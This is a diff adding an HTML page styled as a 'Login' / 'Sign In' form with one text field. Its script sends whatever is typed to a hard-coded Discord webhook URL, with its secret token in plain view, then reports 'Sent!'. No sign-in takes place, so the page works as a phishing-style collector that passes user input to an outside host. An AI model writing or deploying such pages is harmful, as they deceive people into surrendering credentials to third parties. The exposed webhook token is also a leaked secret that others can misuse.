@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title> Login </title>
+  <style>
+    body { font-family: Arial; display:flex; justify-content:center; align-items:center; height:100vh; background:#f4f4f4; }
+    .box { background:white; padding:25px; width:300px; border-radius:10px; box-shadow:0 0 10px rgba(0,0,0,0.1); }
+    input, button { width:100%; padding:10px; margin-top:10px; border-radius:6px; border:1px solid #ccc; }
+    button { background:#3897f0; color:white; border:none; cursor:pointer; }
+  </style>
+</head>
+<body>
+
+  <div class="box">
+    <h2> Sign In </h2>
+    <input id="user" type="text" placeholder="Enter something…" />
+    <button onclick="send()">Submit</button>
+  </div>
+
+  <script>
+    async function send() {
+      const text = document.getElementById("user").value;
+
+      await fetch("https://discord.com/api/webhooks/1446900731742523646/cu3IEgN-WE5trLFzKQ_gci-XZq4pud_54AjJSc1galU5VAC2TZXPSa-gKCbBC3lKA1Eg", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: `New submission: ${text}`
+        })
+      });
+
+      alert("Sent!");
+    }
+  </script>
+
+</body>
+</html>
